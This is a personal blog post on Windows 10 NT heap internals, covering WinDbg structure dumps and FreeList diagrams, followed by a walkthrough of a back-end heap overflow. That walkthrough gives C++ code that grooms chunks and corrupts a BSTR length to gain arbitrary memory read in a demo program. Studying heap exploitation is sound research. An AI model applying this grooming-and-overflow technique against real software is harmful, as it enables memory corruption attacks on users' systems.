---
layout: single
title:  "win 10 heap internal & exploitation"
date:   2020-01-01
toc: true
toc_label: Table
toc_sticky: true
classes: wide

---






## Summary 

In this post , I am going to share my understanding and my own observation during my research on Windows 10 heap internal & exploitation.  This post was not reviewed by anyone , so please if you noticed that I made a mistake in this post, please email me about the issue . The post was based on a great researchers  **Wei Chen , Corelan Team and Angel Boy**  I highly recommend to read the references that I will list in this post. Lastly , the code based that used in this post was taken from Wei Chen and I modify it a little bit.



## Intro to heap internal in windows 10 



There are a 2 way to allocate memory in Windows 10 

* ​	NT Heap 

  * This by default 

* SegmentHeap 

  * This a new memory allocation in windows 10

    



Now let's focus on NT heap , so we can say **Nt Heap ** can be divided into 2 categories

* Back-End
* Front-End
  * LowFragmentationHeap





What is back-end allocation ? 

the back-end allocator (BEA) is the default/active mechanism used to manage freed chunks (https://www.corelan.be/index.php/2016/07/05/windows-10-x86wow64-userland-heap/)



In windows 10 if you try to allocate a new blocks of memory in the heap region , it will make some syscall till reach its goal , so let's start with the normal allocation. If you request a new blocks of memory and the condition not met to activate LFH , then it will make these call 

```
HeapAlloc -> RtlAllocateHeap -> RtlpAllocateHeap 

```

Let's verify our theory by using Windbg and make a breakpoint at the allocation line,

```
	0:000> wt
   19     0 [  0] ntdll!RtlAllocateHeap
   88     0 [  1]   ntdll!RtlpAllocateHeapInternal
  483     0 [  2]     ntdll!RtlpAllocateHeap
   54     0 [  3]       ntdll!RtlpHeapRemoveListEntry
  575    54 [  2]     ntdll!RtlpAllocateHeap
   23     0 [  3]       ntdll!RtlpFindEntry
   51     0 [  4]         ntdll!RtlpHeapFindListLookupEntry
   29    51 [  3]       ntdll!RtlpFindEntry
  614   134 [  2]     ntdll!RtlpAllocateHeap
   42     0 [  3]       ntdll!RtlpHeapAddListEntry
  672   176 [  2]     ntdll!RtlpAllocateHeap
    3     0 [  3]       ntdll!RtlpAllocateHeap
  690   179 [  2]     ntdll!RtlpAllocateHeap
  115   869 [  1]   ntdll!RtlpAllocateHeapInternal
   23   984 [  0] ntdll!RtlAllocateHeap

   
```



If the LFH activate then it will has additional checks and functions to be call such as **RtlpLowFragment**

 

## HeapBased Structure 

let's take a look at HeapBased structure by using dt _heap command



```
0:004> dt _heap
ntdll!_HEAP
   +0x000 Segment          : _HEAP_SEGMENT
   +0x000 Entry            : _HEAP_ENTRY
   +0x010 SegmentSignature : Uint4B
   +0x014 SegmentFlags     : Uint4B
   +0x018 SegmentListEntry : _LIST_ENTRY
   +0x028 Heap             : Ptr64 _HEAP
   +0x030 BaseAddress      : Ptr64 Void
   +0x038 NumberOfPages    : Uint4B
   +0x040 FirstEntry       : Ptr64 _HEAP_ENTRY
   +0x048 LastValidEntry   : Ptr64 _HEAP_ENTRY
   +0x050 NumberOfUnCommittedPages : Uint4B
   +0x054 NumberOfUnCommittedRanges : Uint4B
   +0x058 SegmentAllocatorBackTraceIndex : Uint2B
   +0x05a Reserved         : Uint2B
   +0x060 UCRSegmentList   : _LIST_ENTRY
   +0x070 Flags            : Uint4B
   +0x074 ForceFlags       : Uint4B
   +0x078 CompatibilityFlags : Uint4B
   +0x07c EncodeFlagMask   : Uint4B
   +0x080 Encoding         : _HEAP_ENTRY
   +0x090 Interceptor      : Uint4B
   +0x094 VirtualMemoryThreshold : Uint4B
   +0x098 Signature        : Uint4B
   +0x0a0 SegmentReserve   : Uint8B
   +0x0a8 SegmentCommit    : Uint8B
   +0x0b0 DeCommitFreeBlockThreshold : Uint8B
   +0x0b8 DeCommitTotalFreeThreshold : Uint8B
   +0x0c0 TotalFreeSize    : Uint8B
   +0x0c8 MaximumAllocationSize : Uint8B
   +0x0d0 ProcessHeapsListIndex : Uint2B
   +0x0d2 HeaderValidateLength : Uint2B
   +0x0d8 HeaderValidateCopy : Ptr64 Void
   +0x0e0 NextAvailableTagIndex : Uint2B
   +0x0e2 MaximumTagIndex  : Uint2B
   +0x0e8 TagEntries       : Ptr64 _HEAP_TAG_ENTRY
   +0x0f0 UCRList          : _LIST_ENTRY
   +0x100 AlignRound       : Uint8B
   +0x108 AlignMask        : Uint8B
   +0x110 VirtualAllocdBlocks : _LIST_ENTRY
   +0x120 SegmentList      : _LIST_ENTRY
   +0x130 AllocatorBackTraceIndex : Uint2B
   +0x134 NonDedicatedListLength : Uint4B
   +0x138 BlocksIndex      : Ptr64 Void
   +0x140 UCRIndex         : Ptr64 Void
   +0x148 PseudoTagEntries : Ptr64 _HEAP_PSEUDO_TAG_ENTRY
   +0x150 FreeLists        : _LIST_ENTRY
   +0x160 LockVariable     : Ptr64 _HEAP_LOCK
   +0x168 CommitRoutine    : Ptr64     long 
   +0x170 StackTraceInitVar : _RTL_RUN_ONCE
   +0x178 CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA
   +0x198 FrontEndHeap     : Ptr64 Void
   +0x1a0 FrontHeapLockCount : Uint2B
   +0x1a2 FrontEndHeapType : UChar
   +0x1a3 RequestedFrontEndHeapType : UChar
   +0x1a8 FrontEndHeapUsageData : Ptr64 Wchar
   +0x1b0 FrontEndHeapMaximumIndex : Uint2B
   +0x1b2 FrontEndHeapStatusBitmap : [129] UChar
   +0x238 Counters         : _HEAP_COUNTERS
   +0x2b0 TuningParameters : _HEAP_TUNING_PARAMETERS

```



```
   +0x198 FrontEndHeap     : Ptr64 Void // Point to LFH structre if it currently used
```





A **_HEAP_LIST_LOOKUP**  structure is used to keep track of free chunk based on their size and will be called a BlocksIndex or a ListLookup. 



* Heap Frond-End - LFH
  * it can be managed by _LFH_HEAP , it will hold chunk sizes under 16-k-bytes , to trigger LFH , you must created 18 consecutive allocations or 17 consecutive allocations
  * dt _LFH_HEAP 0x0000xxx



**_Heap Structure ** 

* BlocksIndex

  * Used to manage the chunks 

* FreeList

  * based on a double linkedList and it used to collected the free chunk in the back-end 
    * Blink
      * point to the Previous pointer of the FreeList
    * Flink
      * point to the next pointer of the FreeList

  



```
0:000> dt _HEAP_ENTRY
ntdll!_HEAP_ENTRY
   +0x000 UnpackedEntry    : _HEAP_UNPACKED_ENTRY
   +0x000 PreviousBlockPrivateData : Ptr64 Void
   +0x008 Size             : Uint2B // size of flag
   +0x00a Flags            : UChar // check if chunk busy or not
   +0x00b SmallTagIndex    : UChar
   +0x008 SubSegmentCode   : Uint4B
   +0x00c PreviousSize     : Uint2B // priv size
   +0x00e SegmentOffset    : UChar
   +0x00e LFHFlags         : UChar
   +0x00f UnusedBytes      : UChar // remaining bytes that didn't use
   +0x008 CompactHeader    : Uint8B
   +0x000 ExtendedEntry    : _HEAP_EXTENDED_ENTRY
   +0x000 Reserved         : Ptr64 Void
   +0x008 FunctionIndex    : Uint2B
   +0x00a ContextValue     : Uint2B
   +0x008 InterceptorValue : Uint4B
   +0x00c UnusedBytesLength : Uint2B
   +0x00e EntryOffset      : UChar
   +0x00f ExtendedBlockSignature : UChar
   +0x000 ReservedForAlignment : Ptr64 Void
   +0x008 Code1            : Uint4B
   +0x00c Code2            : Uint2B
   +0x00e Code3            : UChar
   +0x00f Code4            : UChar
   +0x00c Code234          : Uint4B
   +0x008 AgregateCode     : Uint8B
```



FreeList diagram  

```
    _HEAP

+----------------+
|    ......      |                           Double-LinkedList
|                |
|    BlocksIndex |           +------------+               +------------+
+----------------+           |            |               |            |
|                |           |    Size    |               |    Size    |
|    FreeList    +---------->-------------+              <-------------+
|                |           |            |               |            |
+----------------+           |    Flink   <---------------+    Flink   |
|                |           +------------+               +------------+
|   FrontEndHeap |           |            |               +            |
|                |           |    Blink   +---------------+    Blink   |
|                |           +------------+               +------------+
+----------------+
|                |
|                |
|                |
+----------------+
|                |
|                |
+----------------+

```



```
heap1!_LIST_ENTRY
   +0x000 Flink // • Point to the next chunk of VirtualAlloc
   +0x008 Blink // Point to the previous chunk of VirtualAlloc
   
```



First 

```
HeapFree(hDefaultHeap, HEAP_NO_SERIALIZE, allocations[3]); // size 0x58		
```

```
    _HEAP

+----------------+
|    ......      |                           Double-LinkedList
|                |              0x123                      0x456
|    BlocksIndex |           +------------+               +------------+
+----------------+           |            |               |            |
|                |           |    0x58    |               |            |
|    FreeList    +---------->-------------+               +------------+
|                |           |            |               |            |
+----------------+           |    0x456   +-------------->+    NULL    |
|                |           +------------+               +------------+
|   FrontEndHeap |           |            |               |            |
|                |           |    0x123   <---------------+    0x123   |
|                |           +------------+               +------------+
+----------------+
|                |
|                |
|                |
+----------------+
|                |
|                |
+----------------+

```



second 

```
HeapFree(hDefaultHeap, HEAP_NO_SERIALIZE, allocations[4]); //size 0x45
```

you can noticed here the free insert in order and the privious chunk moved to the next FreeList[1]

```
    _HEAP

+----------------+
|    ......      |                           Double-LinkedList
|                |              0x123                      0x456
|    BlocksIndex |           +------------+               +------------+
+----------------+           |            |               |            |
|                |           |    0x45    |               |    0x58    |
|    FreeList    +---------->-------------+               +------------+
|                |           |            |               |            |
+----------------+           |    0x456   +-------------->+    NULL    |
|                |           +------------+               +------------+
|   FrontEndHeap |           |            |               |            |
|                |           |    0x123   <---------------+    0x123   |
|                |           +------------+               +------------+
+----------------+
|                |
|                |
|                |
+----------------+
|                |
|                |
+----------------+

```





Third

```
HeapFree(hDefaultHeap, HEAP_NO_SERIALIZE, allocations[5]); // size 0x60
```



```
    _HEAP

+----------------+
|    ......      |                           Double-LinkedList
|                |              0x123                      0x456                        0x789
|    BlocksIndex |           +------------+               +------------+              +------------+
+----------------+           |            |               |            |              |            |
|                |           |    0x45    |               |    0x58    |              |    0x60    |
|    FreeList    +---------->-------------+               +------------+              +------------+
|                |           |            |               |            |              |            |
+----------------+           |    0x456   +-------------->+    0x789   +-------------->    NULL    |
|                |           +------------+               +------------+              +------------+
|   FrontEndHeap |           |            |               |            |              |            |
|                |           |    0x123   <---------------+    0x123   <--------------+    0x456   |
|                |           +------------+               +------------+              +------------+
+----------------+
|                |
|                |
|                |
+----------------+
|                |
|                |
+----------------+

```













#2

Freeing allocation at index 3 : 0x01532770
Free allocations[3] .. press enter to continue

[0] BSTR string : 0x01532774
BSTR allocate
Freeing allocation at index 4 : 0x01532b88
Original String size: 512
Overflowing allocation 2
Press return to continue

as you can see here , after free the allocaion[4] , it merge the privious size to the new free and allocation[4] become 608 instead of 418

        01531b20: 01018 . 00418 [107] - busy (400), tail fill
        01531f38: 00418 . 00418 [107] - busy (400), tail fill
        01532350: 00418 . 00418 [107] - busy (400), tail fill
        01532768: 00418 . 00228 [107] - busy (210), tail fill
        01532990: 00228 . 00608 [104] free fill
        01532f98: 00608 . 00418 [107] - busy (400), tail fill
        



## Back-End Exploitation 



In this part I will show you how to exploit the back-end allocaions. Heap in windows 10 has a rules and you should be consider when you allocate a new chunk about the size ! so it is very important to understand how heap behave  , so since we are dealing only with back-end , let's  keep in mind that **Activation LFH** will affect all your exploitations, and the LFH will activated if the allocation was 17 and has the same size as its neighbor. 

Here is the steps that we are going to take in this post

* Allocate no more 8 chunks and it should be <= 0x4000

* Free a chunk between 3 to 7 , let's say allocation[3]

* Created a target object that you are intended to corrupt it

* Free the next chunk allocation[4]

* Overflow allocation[2] and corrupt the object length 

* info leak ... etc

  * ROP
    * win()

  





Let's create 8 chuck with  <= 0x4000 size , to avoid activation LFH  

```
	for (i = 0; i < 9; i++)
	{
		hChunk = HeapAlloc(hDefaultHeap, 0, 0x400);
		memset(hChunk, 'A', 0x400);
		allocations[i] = hChunk;
		printf("[%d] Heap chunk in backend : 0x%08x\n", i, allocations[i]);
		cout << hex << "the gap from : " << hChunk << " to privious chunk :" << hex << res << " is : " << (int)hChunk - res << endl;
		res = (int)hChunk;

	}
```



now let's free the third idx

```
	printf("Freeing allocation at index 3 : 0x%08x\n", allocations[3]);
	HeapFree(hDefaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
	printf("Free allocations[3] .. press enter to continue\n");
	cin.ignore();


```



Allocate an Object and it will placed in the heap region and lucky to have it in the same address that we freed before ! , this object will be our target that we are going to use it to get **Arbitrary memory reading & writing** 

```
	i = 0;
	//Rapid7 size A's didn't work , you must allocate bigger than old one
	//it might the latest update of windows 10 , get some changes in the heap functionality 
	bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
	bStrings[i] = bstr;
	printf("[%d] BSTR string : 0x%08x\n", i, bstr);
	printf("BSTR allocate\n");
```



Free the 4 idx and this will let the unused sized in the previous chunk merge to the current chunk size

```
	printf("Freeing allocation at index 4 : 0x%08x\n", allocations[4]);
	HeapFree(hDefaultHeap, HEAP_NO_SERIALIZE, allocations[4]);


```



Here where we are corrupt the object in order to get arbitrary memory read.

```
	UINT strSize = SysStringByteLen(bStrings[0]);
	printf("Original String size: %d\n", (int)strSize);
	printf("Overflowing allocation 2\n");

	printf("Press return to continue\n");
	cin.ignore();
	memset(allocations[2], 'C', 0x400+0x8);
	memcpy((char*)allocations[2] +  0x400+0x8, "\xff\xff", 3);
	strSize = SysStringByteLen(bStrings[0]);
	printf("Modified String size: %d\n", (int)strSize);
	
```





<img src="{{ site.url }}{{ site.baseurl }}/assets/images/heap_f.PNG" alt="">



as you can see , we can read memory address , also it possible to get more length to reach more address in the current process. I left the rest of the work such as **arbitrary write and ROP..etc**   to the reader to challenge its self  





## Code

<script src="https://gist.github.com/0x43434343/5f03313d02829fe289b08e7e94baa59b.js"></script>

## Wrap Up 



The post will be updated as soon as I get more details about how the heap behave in Windows 10 ,  I'll try to do more research about low-fragmentations and the new segment heap structures.



# References 

[http://illmatics.com/Windows%208%20Heap%20Internals.pdf](http://illmatics.com/Windows 8 Heap Internals.pdf)

https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf

https://www.corelan.be/index.php/2016/07/05/windows-10-x86wow64-userland-heap/

https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/

https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version
